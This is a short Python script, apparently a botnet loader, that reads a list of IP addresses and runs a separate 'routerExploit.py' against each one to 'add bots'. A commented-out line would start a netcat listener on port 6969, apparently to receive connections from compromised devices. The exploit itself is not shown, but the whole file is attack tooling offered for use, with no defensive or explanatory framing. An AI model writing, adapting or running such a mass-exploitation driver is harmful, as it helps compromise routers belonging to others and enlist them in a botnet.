import sys, threading, os
#lsd = ("xterm -e netcat -l -p 6969")
#os.system(lsd)
print("[!]ADDING BOTS[!]")
def loligang(input_file):
	input_file = open(sys.argv[1])
	for i in input_file.readlines():
		ip = i.strip("\n")
		try:
			print("[+]Adding: " + ip + " [+]")
			hydrocodone = ("python routerExploit.py " + ip)
			print(hydrocodone)
			os.system(hydrocodone)
		except:
			pass
	input_file.close()
if __name__ == "__main__":
	x = threading.Thread(target=loligang, args=(1,))
	x.start()
